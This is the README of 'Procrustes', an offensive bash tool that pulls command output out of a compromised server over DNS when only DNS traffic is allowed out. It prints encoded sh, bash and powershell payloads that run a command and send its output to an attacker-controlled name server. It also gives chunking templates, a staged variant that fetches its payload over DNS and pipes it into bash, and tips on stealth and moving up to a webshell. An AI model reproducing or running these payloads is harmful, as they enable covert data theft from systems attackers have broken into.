# Procrustes

A bash script that automates the exfiltration of data over dns in case we have a blind command execution on a server where all outbound connections except DNS are blocked. The script currently supports sh, bash and powershell and is compatible with exec style command execution (e.g. java.lang.Runtime.exec).

Unstaged:
<p align="center">
  <img width="680" src="images/op.gif"/>
</p>

Staged:
<p align="center">
  <img width="680" src="images/staged.gif"/>
</p>

For its operations, the script takes as input the command we want to run on the target server and transforms it according to the target shell in order to allow its output to be exfiltrated over DNS. After the command is transformed, it's fed to the "dispatcher". The dispatcher is a program provided by the user and is responsible for taking as input a command and have it executed on the target server by any means necessary (e.g. exploiting a vulnerability). After the command is executed on the target server, it is expected to trigger DNS requests to our DNS name server containing chunks of our data. The script listens for those requests until the output of the user provided command is fully exfiltrated.

Below are the supported command transformations, generated for the exfiltration of the command: `ls`

sh:
```bash
sh -c $@|base64${IFS}-d|sh . echo IGRpZyBAMCArdHJpZXM9NSBgKGxzKXxiYXNlNjQgLXcwfHdjIC1jYC5sZW4xNjAzNTQxMTc4LndoYXRldi5lcgo=
```

bash:
```bash
bash -c {echo,IG5zbG9va3VwIGAobHMpfGJhc2U2NCAtdzB8d2MgLWNgLmxlbi4xNjAzMDMwNTYwLndoYXRldi5lcgo=}|{base64,-d}|bash
```

powershell:
```bash
powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsAMQB9AC4AewAyAH0AIgAgAC0AZgAgACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAoAGwAcwApACkAKQAuAGwAZQBuAGcAdABoACkALAAiAGwAZQBuACIALAAiADEANgAwADMAMAAzADAANAA4ADgALgB3AGgAYQB0AGUAdgAuAGUAcgAiACkACgA=
```

## Usage
1. Local testing for bash:
```bash
./procroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
```

2. Local testing for powershell with WSL2:
```bash
stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
```

3. powershell example where we ssh into our NS to get the incoming DNS requests.
```bash
./procroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x dispatcher_examples/curl_waf.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
```

4. More information on the options
```bash
./procroustes_chunked.sh --help
```

### procrustes flavours

In a nutshell, assuming we want to exfiltrate some data that has to be broken into four chunks in order to be able to be transmitted over DNS:
* procroustes_chunked: runs the command four times, each time calling the dispatcher and requesting a different chunk from the server
Pros:
 - It's fast
 - Payload size can be relatively small
 - No need to run the python script on the name server
Cons:
 - Dispatcher is called multiple times: this may slow the whole process down in case the exploitation of the issue that leads to command execution is resource/time intensive.
 - Command on the server is executed multiple times: in case the executed command is not idempotent (functionality or output-wise, e.g. process listing) or is time/resource intensive it may lead to corrupted results. A workaround for this is to first store the command output into a file (e.g. /tmp/file) and then read that file.

* procroustes_full: calls the dispatcher once, the command that will get executed on the server will be responsible for chunking the data and sending them over.
Pros:
 - Fast, its speed can be adjusted by the use of the parameter -t, which increases the level of parallelism when exfiltrating the data
 - Dispatcher is called once
Cons:
 - Payload size is normally bigger than chunked version
 - For optimal speed requires running the provided dns server
* procroustes_full/staged: same as procroustes_full, but uses a stager to get the command used by procroustes_full to chunk the data.
Pros:
 - Very small payload size (stager)[1A]
 - Dispatcher is called once
Cons:
 - Overhead with regards to setting up the nsconfig script. Nevertheless, this set up has to be performed only once per ns server.
 - Time overhead in downloading the actual payload.[1B]

[1] Currently we make use of A records to download the payload which limits the communication bandwidth (e.g. 4 bytes per request). Transitioning to a different record with higher capacity for holding data (e.g. TXT) will decrease the stager size even further and bring the speed to similar level with procroustes_full. Nevertheless, A records might be the most stealthy option.

Some of their differences can also be illustrated through the template commands used for bash/powershell:

procroustes_chunked/bash:
```bash
%DNS_TRIGGER% `(%CMD%)|base64 -w0|cut -b$((%INDEX%+1))-$((%INDEX%+%COUNT%))'`.%UNIQUE_DNS_HOST%
```
procroustes_full/bash:
```bash
(%CMD%)|base64 -w0|echo $(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|awk '{printf "%s.%s%s\n",$1,NR,"%UNIQUE_DNS_HOST%"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%
```
procroustes_full/bash/staged:
```bash
(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash
```

---------------------------------------


|                       | procroustes_chunked                | procroustes_full  |  procroustes_full_staged  |
| -------------         |:-------------:               |:-----:         |:-----:         |
| payload size overhead (bash/powershell) | 150\*NLABELS/500\*NLABELS (+CMD_LEN)          | 300/800 (+CMD_LEN)       |   150/400  |
| dispatcher calls #     | #output/(LABEL_SIZE*NLABELS) |   1          |                1    |
| speed (bash/powershell)                | ✔/✔                         |  ✔/✔         | ✓/✓ (procroustes_full+stage download time)|

### Tips

 - You probably want to use this script as little as possible, try to transition to a higher bandwidth channel the soonest possible (e.g. HTTP-webshell)
 - In case long text output is expected, you can try compressing it first to speed up the exfil process, e.g. ./procrustes_full.sh ... -o >(setsid gunzip) -- 'ls -lhR / | gzip'
 - Another possibility for big/binary files is to copy them to a path which is accessible for example through HTTP
 - For increased exfil bandwidth, run the staged_files/dnsns.py on your name server. That way, we avoid waiting for the underlying DNS_TRIGGER to timeout before moving on to a new chunk.
 - Ideally, you would have a domain (-h option) with an NS record pointing to a server you control (server where we run tcpdump). Nevertheless, in case the target is allowed to initiate connections to arbitrary DNS servers, this can be avoided by having the DNS trigger explicitly set to use our DNS server (e.g. dig @your_server whatev.er)

### Credits
* [Collabfiltrator](https://github.com/0xC01DF00D/Collabfiltrator) - idea of chunking the data on the server. It also performs similar functionalities with this script, so check it out.
* [DNSlivery](https://github.com/no0be/DNSlivery) - modified version of DNSlivery is used as DNS server in the staged version